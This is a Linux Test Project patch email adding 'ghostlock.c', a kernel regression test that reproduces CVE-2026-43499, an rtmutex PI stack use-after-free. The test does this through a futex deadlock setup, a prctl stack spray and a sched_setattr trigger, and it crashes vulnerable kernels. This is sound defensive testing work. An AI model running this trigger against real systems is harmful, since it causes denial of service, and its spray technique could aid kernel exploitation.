Return-Path: <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from picard.linux.it (picard.linux.it [213.254.12.146])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id DB235C61DBD
	for <ltp@archiver.kernel.org>; Wed, 26 Aug 2026 12:42:03 +0000 (UTC)
Received: from picard.linux.it (localhost [IPv6:::1])
	by picard.linux.it (Postfix) with ESMTP id 2DEBB3CE321
	for <ltp@archiver.kernel.org>; Wed, 26 Aug 2026 14:42:02 +0200 (CEST)
Received: from in-2.smtp.seeweb.it (in-2.smtp.seeweb.it
 [IPv6:2001:4b78:1:20::2])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature ECDSA (secp384r1))
 (No client certificate requested)
 by picard.linux.it (Postfix) with ESMTPS id 3D0E63CCE09
 for <ltp@lists.linux.it>; Wed, 26 Aug 2026 14:41:08 +0200 (CEST)
Received: from smtp-out2.suse.de (smtp-out2.suse.de
 [IPv6:2a07:de40:b251:101:10:150:64:2])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
 (No client certificate requested)
 by in-2.smtp.seeweb.it (Postfix) with ESMTPS id 9D0206001FD
 for <ltp@lists.linux.it>; Wed, 26 Aug 2026 14:41:07 +0200 (CEST)
Received: from imap1.dmz-prg2.suse.org (unknown [10.150.64.97])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
 (No client certificate requested)
 by smtp-out2.suse.de (Postfix) with ESMTPS id 5A3801F852;
 Wed, 26 Aug 2026 12:40:58 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
 t=1787748062; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding:
 in-reply-to:in-reply-to:references:references;
 bh=XKXSRByw9R670M4WibMsljX/sOJKFrkhnr6n8liAIeM=;
 b=rUjZJir3iD56SLUBfI+OyTVbS3DQN6hfhzVcaat+l0j6/Ki04BinEw16Ug1RwKal8LvZ2w
 sDYhEnYouSwY/uLgIP9ew3o/WZMUjqRhLqy733W1gGcx//ZTAQUXiGjixB5vclbhJZwmow
 /1st+Ln7hr0c96LPXLPRidDEX+0pTns=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
 s=susede2_ed25519; t=1787748062;
 h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding:
 in-reply-to:in-reply-to:references:references;
 bh=XKXSRByw9R670M4WibMsljX/sOJKFrkhnr6n8liAIeM=;
 b=iFlT3zDh25rKLX/U+bS2SalDt4R8b1rJHsJp0xgZhHx0JdM8zWabjO1KUskHl3RKvi+ORO
 evv2OnXVs0IkKVBA==
Authentication-Results: smtp-out2.suse.de;
	none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
 t=1787748058; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding:
 in-reply-to:in-reply-to:references:references;
 bh=XKXSRByw9R670M4WibMsljX/sOJKFrkhnr6n8liAIeM=;
 b=aySvIC0PitOjwGIAtSYoZHm4uH9lya5JLptQB2UAUTQIzcWtX1zm2ROLRJsXciLO0IE0T8
 Z1v3POvzxEWR6r3Ot8iqtUp4g+EYeFzGlx/YbwD8G97OIhBREMG7N2tt7xz/f+urE674uV
 KLXCao6+I5EkTRuOSihAjowsZ3oXZ2k=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
 s=susede2_ed25519; t=1787748058;
 h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding:
 in-reply-to:in-reply-to:references:references;
 bh=XKXSRByw9R670M4WibMsljX/sOJKFrkhnr6n8liAIeM=;
 b=I/XGSm/YECRQIlBz5PYTsxfME7USjqjFtvbyTWdeedXu/nLReHNMdyTHvOUjk7KNMtYSIK
 BiGW6Ggi/w6n6WAQ==
Received: from imap1.dmz-prg2.suse.org (localhost [127.0.0.1])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
 (No client certificate requested)
 by imap1.dmz-prg2.suse.org (Postfix) with ESMTPS id 3D4601364A;
 Wed, 26 Aug 2026 12:40:58 +0000 (UTC)
Received: from dovecot-director2.suse.de ([2a07:de40:b281:106:10:150:64:167])
 by imap1.dmz-prg2.suse.org with ESMTPSA id MMt0DdrejmpuNwAAD6G6ig
 (envelope-from <andrea.cervesato@suse.de>); Wed, 26 Aug 2026 12:40:58 +0000
From: Andrea Cervesato <andrea.cervesato@suse.de>
Date: Wed, 26 Aug 2026 14:40:58 +0200
MIME-Version: 1.0
Message-Id: <20260826-cve-ghostlock-v4-2-52ec94d6635f@suse.com>
References: <20260826-cve-ghostlock-v4-0-52ec94d6635f@suse.com>
In-Reply-To: <20260826-cve-ghostlock-v4-0-52ec94d6635f@suse.com>
To: Linux Test Project <ltp@lists.linux.it>
X-Mailer: b4 0.16.0
X-Developer-Signature: v=1; a=ed25519-sha256; t=1787748057; l=9423;
 i=andrea.cervesato@suse.com; s=20251210; h=from:subject:message-id;
 bh=L6YuphfCP21fYbd0VtcIgSs+CVNRl/fH81KxS4SR4Tk=;
 b=9VS8J36yNKb8qvNpt11qpq3xUp1vnJ3V5rfq78mjS/IeqCqZNoX97OETQseDnlV1is3PwyihN
 o7qfm6q5K+VDc/uzEv6qqjFvu8CKw0EJJiurOHh2EMe1nqlhcQWo+B8
X-Developer-Key: i=andrea.cervesato@suse.com; a=ed25519;
 pk=zKY+6GCauOiuHNZ//d8PQ/UL4jFCTKbXrzXAOQSLevI=
X-Spamd-Result: default: False [-4.30 / 50.00]; BAYES_HAM(-3.00)[100.00%];
 NEURAL_HAM_LONG(-1.00)[-1.000];
 NEURAL_HAM_SHORT(-0.20)[-1.000]; MIME_GOOD(-0.10)[text/plain];
 RCPT_COUNT_TWO(0.00)[2]; RCVD_TLS_ALL(0.00)[];
 RCVD_VIA_SMTP_AUTH(0.00)[]; ARC_NA(0.00)[];
 DKIM_SIGNED(0.00)[suse.de:s=susede2_rsa,suse.de:s=susede2_ed25519];
 TO_DN_ALL(0.00)[]; TO_MATCH_ENVRCPT_ALL(0.00)[];
 FROM_HAS_DN(0.00)[]; MIME_TRACE(0.00)[0:+];
 FROM_EQ_ENVFROM(0.00)[]; RCVD_COUNT_TWO(0.00)[2];
 DBL_BLOCKED_OPENRESOLVER(0.00)[suse.com:mid, suse.com:email,
 imap1.dmz-prg2.suse.org:helo]
X-Virus-Scanned: clamav-milter 1.0.9 at in-2.smtp.seeweb.it
X-Virus-Status: Clean
Subject: [LTP] [PATCH v4 2/2] cve: add CVE-2026-43499 reproducer
X-BeenThere: ltp@lists.linux.it
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Linux Test Project <ltp.lists.linux.it>
List-Unsubscribe: <https://lists.linux.it/options/ltp>,
 <mailto:ltp-request@lists.linux.it?subject=unsubscribe>
List-Archive: <http://lists.linux.it/pipermail/ltp/>
List-Post: <mailto:ltp@lists.linux.it>
List-Help: <mailto:ltp-request@lists.linux.it?subject=help>
List-Subscribe: <https://lists.linux.it/listinfo/ltp>,
 <mailto:ltp-request@lists.linux.it?subject=subscribe>
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: 7bit
Errors-To: ltp-bounces+ltp=archiver.kernel.org@lists.linux.it
Sender: "ltp" <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>

From: Andrea Cervesato <andrea.cervesato@suse.com>

Add "Ghostlock" reproducer for CVE-2026-43499.

Reproducer based on the Nebula Security writeup and open-sourced PoC
(https://nebusec.ai/research/ionstack-part-2/,
https://github.com/NebuSec/CyberMeowfia).

Beware, this test will crash the system on a vulnerable kernel.

Signed-off-by: Andrea Cervesato <andrea.cervesato@suse.com>
---
 runtest/cve               |   1 +
 testcases/cve/.gitignore  |   1 +
 testcases/cve/Makefile    |   1 +
 testcases/cve/ghostlock.c | 258 ++++++++++++++++++++++++++++++++++++++++++++++
 4 files changed, 261 insertions(+)

diff --git a/runtest/cve b/runtest/cve
index b096bacef..ac721f453 100644
--- a/runtest/cve
+++ b/runtest/cve
@@ -87,6 +87,7 @@ cve-2022-23222 bpf_prog07
 cve-2023-1829 tcindex01
 cve-2023-0461 setsockopt10
 cve-2023-31248 nft02
+cve-2026-43499 ghostlock
 cve-2023-52879 fanotify25
 cve-2026-53362 setsockopt11
 cve-2026-64600 refluxfs
diff --git a/testcases/cve/.gitignore b/testcases/cve/.gitignore
index a167a8743..f25aaf23a 100644
--- a/testcases/cve/.gitignore
+++ b/testcases/cve/.gitignore
@@ -18,3 +18,4 @@ cve-2025-21756
 cve-2026-46331
 refluxfs
 sctphantom
+ghostlock
diff --git a/testcases/cve/Makefile b/testcases/cve/Makefile
index 6be4999a3..92d876707 100644
--- a/testcases/cve/Makefile
+++ b/testcases/cve/Makefile
@@ -12,6 +12,7 @@ stack_clash:	CFLAGS += -fno-optimize-sibling-calls -Wno-infinite-recursion
 cve-2016-7042:	LDLIBS += $(KEYUTILS_LIBS)
 
 cve-2014-0196 cve-2016-7117 cve-2017-2671 cve-2017-17052 cve-2017-17053 refluxfs:  CFLAGS += -pthread
+cve-2014-0196 cve-2016-7117 cve-2017-2671 cve-2017-17052 cve-2017-17053 ghostlock:  CFLAGS += -pthread
 cve-2014-0196 cve-2016-7117 cve-2017-2671:  LDLIBS += -lrt
 
 ifneq ($(ANDROID),1)
diff --git a/testcases/cve/ghostlock.c b/testcases/cve/ghostlock.c
new file mode 100644
index 000000000..e143e33a4
--- /dev/null
+++ b/testcases/cve/ghostlock.c
@@ -0,0 +1,258 @@
+// SPDX-License-Identifier: GPL-2.0-or-later
+/*
+ * Copyright (c) 2026 Nebula Security <root@nebusec.ai>
+ * Copyright (c) 2026 Linux Test Project
+ */
+
+/*\
+ * Test for CVE-2026-43499 (GhostLock), a stack use-after-free in the
+ * rtmutex PI code, fixed in kernel v7.1:
+ * 3bfdc63936dd ("rtmutex: Use waiter::task instead of current in remove_waiter()")
+ *
+ * Reproducer based on the Nebula Security writeup and open-sourced PoC
+ * (https://nebusec.ai/research/ionstack-part-2/ and
+ * https://github.com/NebuSec/CyberMeowfia).
+ * Beware, this test will crash the system on a vulnerable kernel.
+ *
+ * [Algorithm]
+ *
+ * - Set up a three-futex PI deadlock topology.
+ * - Call :manpage:`futex(2)` with FUTEX_CMP_REQUEUE_PI on the waiter.
+ * - On a vulnerable kernel, the rollback from -EDEADLK leaves the waiter's
+ *   pi_blocked_on pointer dangling on its own stack.
+ * - Waiter sprays its stack continuously via :manpage:`prctl(2)` (PR_SET_MM_MAP)
+ *   with non-canonical addresses while main thread calls :manpage:`sched_setattr(2)`
+ *   on the waiter to trigger a chain walk.
+ * - The chain walk dereferences the sprayed garbage, crashing a vulnerable
+ *   kernel.
+ */
+
+#include "tst_test.h"
+#include "tst_timer.h"
+#include "tst_safe_clocks.h"
+#include "tst_safe_pthread.h"
+#include "lapi/syscalls.h"
+#include "lapi/sched.h"
+#include "lapi/prctl.h"
+#include "lapi/futex.h"
+
+#define ATTEMPTS 128
+#define POISON_PTR 0xdeadbee11c518f58ULL
+#define MAX_AUXV_WORDS 48
+
+#define CP_CHAIN_HELD 0
+#define CP_TARGET_HELD 1
+#define CP_OWNER_BLOCKED 2
+#define CP_SPRAYED 3
+#define CP_SETATTR_DONE 4
+
+static uint32_t f_wait;
+static uint32_t f_pi_target;
+static uint32_t f_pi_chain;
+
+static pid_t waiter_tid;
+static pid_t owner_tid;
+
+static unsigned long auxv[MAX_AUXV_WORDS];
+static uint32_t valid_auxv_size;
+static tst_atomic_t stop_spray;
+
+static const int try_sizes[] = {
+	MAX_AUXV_WORDS,
+	MAX_AUXV_WORDS - 4,
+	MAX_AUXV_WORDS - 8
+};
+
+static int futex_wait_requeue_pi(uint32_t *uaddr, uint32_t *uaddr2,
+				 struct timespec *ts)
+{
+	return tst_syscall(__NR_futex, uaddr, FUTEX_WAIT_REQUEUE_PI, 0, ts,
+			   uaddr2, 0);
+}
+
+static int futex_cmp_requeue_pi(uint32_t *uaddr, uint32_t *uaddr2)
+{
+	return tst_syscall(__NR_futex, uaddr, FUTEX_CMP_REQUEUE_PI, 1, 1,
+			   uaddr2, 0);
+}
+
+static int futex_lock_pi(uint32_t *uaddr)
+{
+	return tst_syscall(__NR_futex, uaddr, FUTEX_LOCK_PI, 0, 0, 0, 0);
+}
+
+static int futex_unlock_pi(uint32_t *uaddr)
+{
+	return tst_syscall(__NR_futex, uaddr, FUTEX_UNLOCK_PI, 0, 0, 0, 0);
+}
+
+static void *waiter_fn(void *arg LTP_ATTRIBUTE_UNUSED)
+{
+	struct timespec ts;
+	struct prctl_mm_map mm_map = {
+		.start_code  = (uint64_t)(uintptr_t)&waiter_fn,
+		.end_code    = (uint64_t)(uintptr_t)&waiter_fn + 0x1000,
+		.start_data  = (uint64_t)(uintptr_t)auxv & ~0xfffUL,
+		.end_data    = ((uint64_t)(uintptr_t)auxv & ~0xfffUL) + 0x1000,
+		.start_brk   = (uint64_t)(uintptr_t)sbrk(0),
+		.brk         = (uint64_t)(uintptr_t)sbrk(0),
+		.start_stack = (uint64_t)(uintptr_t)&mm_map,
+		.arg_start   = (uint64_t)(uintptr_t)&mm_map,
+		.arg_end     = (uint64_t)(uintptr_t)&mm_map,
+		.env_start   = (uint64_t)(uintptr_t)&mm_map,
+		.env_end     = (uint64_t)(uintptr_t)&mm_map,
+		.auxv        = (void *)auxv,
+		.auxv_size   = valid_auxv_size,
+		.exe_fd      = (uint32_t)-1,
+	};
+
+	waiter_tid = tst_syscall(__NR_gettid);
+
+	futex_lock_pi(&f_pi_chain);
+
+	TST_CHECKPOINT_WAKE2(CP_CHAIN_HELD, 2);
+	TST_CHECKPOINT_WAIT(CP_OWNER_BLOCKED);
+
+	SAFE_CLOCK_GETTIME(CLOCK_MONOTONIC, &ts);
+	ts = tst_timespec_add(ts, (struct timespec){ .tv_sec = 10, .tv_nsec = 0 });
+	futex_wait_requeue_pi(&f_wait, &f_pi_target, &ts);
+
+	TST_CHECKPOINT_WAKE(CP_SPRAYED);
+
+	while (!tst_atomic_load(&stop_spray)) {
+		/* This is the syscall that poison the buffer and it might
+		 * fail, so we don't use the SAFE_* variant.
+		 */
+		prctl(PR_SET_MM, PR_SET_MM_MAP, (unsigned long)&mm_map,
+		      sizeof(mm_map), 0);
+	}
+
+	TST_CHECKPOINT_WAIT(CP_SETATTR_DONE);
+
+	futex_unlock_pi(&f_pi_chain);
+
+	return NULL;
+}
+
+static void *owner_fn(void *arg LTP_ATTRIBUTE_UNUSED)
+{
+	owner_tid = tst_syscall(__NR_gettid);
+
+	TST_CHECKPOINT_WAIT(CP_CHAIN_HELD);
+
+	futex_lock_pi(&f_pi_target);
+	TST_CHECKPOINT_WAKE(CP_TARGET_HELD);
+
+	futex_lock_pi(&f_pi_chain);
+
+	futex_unlock_pi(&f_pi_chain);
+	futex_unlock_pi(&f_pi_target);
+
+	return NULL;
+}
+
+static void setup(void)
+{
+	struct prctl_mm_map map = {
+		.exe_fd = (uint32_t)-1,
+		.auxv = (void *)auxv,
+	};
+	unsigned int i, sz = 0;
+
+	SAFE_PRCTL(PR_SET_MM, PR_SET_MM_MAP_SIZE, (unsigned long)&sz, 0, 0);
+
+	for (i = 0; i < MAX_AUXV_WORDS; i++)
+		auxv[i] = POISON_PTR + i * sizeof(unsigned long);
+
+	map.start_code = map.start_data = map.end_data =
+	map.start_brk = map.brk = map.start_stack = map.arg_start =
+	map.arg_end = map.env_start = map.env_end = (uint64_t)(uintptr_t)&sz;
+	map.end_code = map.start_code + 0x1000;
+
+	for (i = 0; i < ARRAY_SIZE(try_sizes); i++) {
+		valid_auxv_size = try_sizes[i] * sizeof(unsigned long);
+		map.auxv_size = valid_auxv_size;
+
+		if (prctl(PR_SET_MM, PR_SET_MM_MAP, &map, sizeof(map), 0) == 0)
+			break;
+	}
+
+	if (i == ARRAY_SIZE(try_sizes))
+		tst_brk(TBROK | TERRNO, "PR_SET_MM_MAP failed for all auxv sizes");
+
+	tst_res(TDEBUG, "Using auxv_size = %u", valid_auxv_size);
+}
+
+static void run(void)
+{
+	pthread_t waiter_th, owner_th;
+	struct sched_attr attr = {
+		.size = sizeof(attr),
+		.sched_policy = SCHED_BATCH,
+		.sched_nice = 19,
+	};
+	int i;
+
+	tst_res(TINFO, "Triggering PI deadlock and stack spray");
+
+	for (i = 0; i < ATTEMPTS; i++) {
+		if (!tst_remaining_runtime())
+			break;
+
+		f_wait = 0;
+		f_pi_target = 0;
+		f_pi_chain = 0;
+		tst_atomic_store(0, &stop_spray);
+
+		SAFE_PTHREAD_CREATE(&waiter_th, NULL, waiter_fn, NULL);
+		SAFE_PTHREAD_CREATE(&owner_th, NULL, owner_fn, NULL);
+
+		TST_CHECKPOINT_WAIT(CP_CHAIN_HELD);
+		TST_CHECKPOINT_WAIT(CP_TARGET_HELD);
+
+		TST_THREAD_STATE_WAIT(owner_tid, 'S', 10000);
+
+		TST_CHECKPOINT_WAKE(CP_OWNER_BLOCKED);
+
+		TST_THREAD_STATE_WAIT(waiter_tid, 'S', 10000);
+
+		TEST(futex_cmp_requeue_pi(&f_wait, &f_pi_target));
+		if (TST_RET != -1 || TST_ERR != EDEADLK)
+			tst_brk(TBROK | TTERRNO, "FUTEX_CMP_REQUEUE_PI did not return -EDEADLK");
+
+		TST_CHECKPOINT_WAIT2(CP_SPRAYED, 18000);
+
+		TEST(sched_setattr(waiter_tid, &attr, 0));
+		if (TST_RET == -1)
+			tst_brk(TBROK | TTERRNO, "sched_setattr() failed");
+
+		tst_atomic_store(1, &stop_spray);
+		TST_CHECKPOINT_WAKE(CP_SETATTR_DONE);
+
+		SAFE_PTHREAD_JOIN(waiter_th, NULL);
+		SAFE_PTHREAD_JOIN(owner_th, NULL);
+	}
+
+	if (i < ATTEMPTS)
+		tst_res(TINFO, "Runtime exhausted, executed %d/%d attempts", i, ATTEMPTS);
+
+	tst_res(TPASS, "Kernel survived %d GhostLock trigger attempts", i);
+}
+
+static struct tst_test test = {
+	.setup = setup,
+	.test_all = run,
+	.runtime = 180,
+	.needs_checkpoints = 1,
+	.needs_kconfigs = (const char *[]) {
+		"CONFIG_CHECKPOINT_RESTORE=y",
+		"CONFIG_FUTEX_PI=y",
+		NULL
+	},
+	.taint_check = TST_TAINT_W | TST_TAINT_D,
+	.tags = (const struct tst_tag[]) {
+		{"linux-git", "3bfdc63936dd"},
+		{"CVE", "2026-43499"},
+		{}
+	},
+};

-- 
2.51.0


-- 
Mailing list info: https://lists.linux.it/listinfo/ltp
